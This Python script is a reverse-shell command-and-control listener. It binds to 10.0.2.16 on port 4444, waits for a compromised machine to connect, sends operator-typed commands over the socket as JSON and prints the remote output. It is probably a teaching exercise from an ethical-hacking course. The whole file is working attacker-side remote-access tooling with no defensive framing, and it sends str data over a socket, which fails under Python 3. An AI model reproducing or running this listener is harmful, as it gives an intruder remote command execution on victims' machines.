import socket
import json

class Listener:

    def __init__(self, ip, port) -> None:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # enable reusing socket
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))

        listener.listen(0)
        print("[+] waiting for incoming connections")
        self.conn, addr = listener.accept()
        print("[+] got a connection from " + str(addr))

    def exec_remotely(self, command):
        self.reliable_send(command) # send list using json encoding

        if command[0] == "exit":
            self.conn.close()
            exit()

        return self.reliable_receive()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data)
    
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            result = self.exec_remotely(command)
            print(result)

listener = Listener("10.0.2.16", 4444)
listener.run()